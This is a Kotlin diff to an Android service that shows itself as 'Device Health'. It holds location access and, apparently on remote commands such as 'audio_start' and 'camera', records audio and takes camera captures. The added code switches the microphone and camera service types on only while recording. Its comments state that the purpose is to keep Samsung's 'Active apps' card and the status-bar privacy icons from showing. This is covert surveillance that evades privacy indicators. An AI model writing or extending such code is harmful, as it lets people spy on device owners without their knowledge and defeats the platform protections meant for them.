@@ -14,7 +14,6 @@ import android.content.pm.ServiceInfo
 import android.net.ConnectivityManager
 import android.net.Network
 import android.os.BatteryManager
-import android.os.Build
 import android.os.IBinder
 import android.os.SystemClock
 import androidx.core.app.NotificationCompat
@@ -51,6 +50,20 @@ class MainService : Service() {
         /** Last statusLoop tick (elapsedRealtime); lets others detect a wedged service. */
         @Volatile
         var lastBeat: Long = 0L
+
+        @Volatile
+        var instance: MainService? = null
+
+        /** Samsung One UI ka "Active apps" card ("1 app active — Device Health")
+         *  tabhi banta hai jab FGS me camera/microphone type chalu ho. Isliye ab
+         *  ham rest par sirf dataSync|location rakhte hain — mic/camera type sirf
+         *  tab upgrade karte hain jab audio/camera SACH ME use ho raha ho, aur kaam
+         *  karte hi wapas downgrade. Card + status-bar privacy icons dono isse
+         *  root se gay. Yahan na ho to no-op (service alag process me mar chuki). */
+        fun updateTypes(withMic: Boolean, withCam: Boolean) {
+            val svc = instance ?: return
+            runCatching { svc.reapplyTypes(withMic, withCam) }
+        }
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -59,22 +72,21 @@ class MainService : Service() {
         super.onCreate()
         running = true
         lastBeat = SystemClock.elapsedRealtime()
+        instance = this
         ensureChannel()
-        var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
-            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-        }
-        // MIC FIX: Android 11+ par background me mic access sirf tab milta hai jab
-        // FGS ka type "microphone" ho — bina iske AudioRecord chupchap SILENCE
-        // deta tha ("mic bhi ni kaam karra"). API 30+ par hi bit pass karte hain.
-        if (Build.VERSION.SDK_INT >= 30 &&
-            ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
-        ) {
-            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-        }
+        // REST types: sirf dataSync|location. Camera/microphone type YAHAN kabhi
+        // nahi — Android 14/15 par background start me in types ke saath
+        // startForeground SecurityException deta hai (fallback dataSync-only par
+        // mic phir bhi while-in-use ke karan silent), aur Samsung Device Care
+        // in types dekh kar "Active apps" card ("1 app active") post karta rehta
+        // hai. Mic/camera ab ForegroundPokeActivity upgrade karta hai jab zaroorat
+        // ho (CommandHandler audio_start/camera) aur kaam karte hi downgrade.
         val notif = buildNotif("Device Health active")
         runCatching {
-            ServiceCompat.startForeground(this, 1, notif, types)
+            ServiceCompat.startForeground(
+                this, 1, notif,
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+            )
         }.onFailure {
             runCatching {
                 ServiceCompat.startForeground(this, 1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
@@ -144,8 +156,26 @@ class MainService : Service() {
         super.onTaskRemoved(rootIntent)
     }
 
+    /** startForeground dobara call karke types upgrade/downgrade karo (Android 14+
+     *  ka blessed pattern: "call startForeground() again and add the new types").
+     *  Mic/cam sirf tab include karo jab permission sach me granted ho, warna
+     *  system SecurityException dega — runCatching me safe hai. */
+    private fun reapplyTypes(withMic: Boolean, withCam: Boolean) {
+        var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+        if (withCam && ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
+            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+        }
+        if (withMic && ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
+            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        }
+        runCatching {
+            ServiceCompat.startForeground(this, 1, buildNotif("Device Health active"), types)
+        }
+    }
+
     override fun onDestroy() {
         running = false
+        instance = null
         runCatching {
             netCb?.let {
                 (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager).unregisterNetworkCallback(it)
